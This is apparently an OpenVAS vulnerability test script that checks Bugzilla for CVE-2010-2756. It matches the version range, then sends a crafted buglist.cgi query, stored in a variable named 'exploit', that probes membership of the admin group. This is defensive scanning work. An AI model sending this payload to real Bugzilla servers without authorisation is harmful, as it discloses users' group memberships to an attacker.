###############################################################################
# OpenVAS Vulnerability Test
#
# Bugzilla Information Disclosure Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mozilla:bugzilla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801570");
  script_version("2019-05-17T10:45:27+0000");
  script_tag(name:"last_modification", value:"2019-05-17 10:45:27 +0000 (Fri, 17 May 2019)");
  script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
  script_cve_id("CVE-2010-2756");
  script_bugtraq_id(42275);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("Bugzilla Information Disclosure Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/41128");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2205");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2035");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2035");
  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=417048");

  script_tag(name:"qod_type", value:"remote_vul");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("bugzilla_detect.nasl");
  script_mandatory_keys("bugzilla/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allows attackers to search for bugs that were
reported by users belonging to one more groups.");

  script_tag(name:"affected", value:"Bugzilla 2.19.1 to 3.2.7, 3.3.1 to 3.4.7, 3.5.1 to 3.6.1 and 3.7 to 3.7.2");

  script_tag(name:"insight", value:"The flaw is due to an error in 'Search.pm' which allows remote attackers to
determine the group memberships of arbitrary users via vectors involving the Search interface, boolean charts, and
group-based pronouns.");

  script_tag(name:"solution", value:"Upgrade to Bugzilla version 3.2.8, 3.4.8, 3.6.2 or 3.7.3.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is running Bugzilla and is prone to information disclosure
vulnerability.");

  script_xref(name:"URL", value:"http://www.bugzilla.org/download/");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if(!infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: TRUE)) exit(0);
vers = infos['version'];
dir = infos['location'];

if(version_in_range(version:vers, test_version: "3.7", test_version2:"3.7.2")||
   version_in_range(version:vers, test_version: "3.5.1", test_version2:"3.6.1")||
   version_in_range(version:vers, test_version: "3.3.1", test_version2:"3.4.7")||
   version_in_range(version:vers, test_version: "2.19.1", test_version2:"3.2.7")) {
  exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" +
            "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0"+
            "%3D%25group.admin%25";

  req = string("GET ", dir, exploit, " HTTP/1.1\r\n",
               "Host: 209.132.180.131\r\n",
               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
               "Accept-Language: en-us,en;q=0.5\r\n",
               "Accept-Encoding: gzip,deflate\r\n",
               "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
               "Keep-Alive: 300\r\n",
               "Connection: keep-alive\r\n\r\n");

  resp = http_keepalive_send_recv(port:port, data:req);

  if (resp) {
     if (eregmatch(pattern:"field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i",
                  string:resp, icase:TRUE)) {
       security_message(port: port);
       exit(0);
     }
  }
}

exit(0);
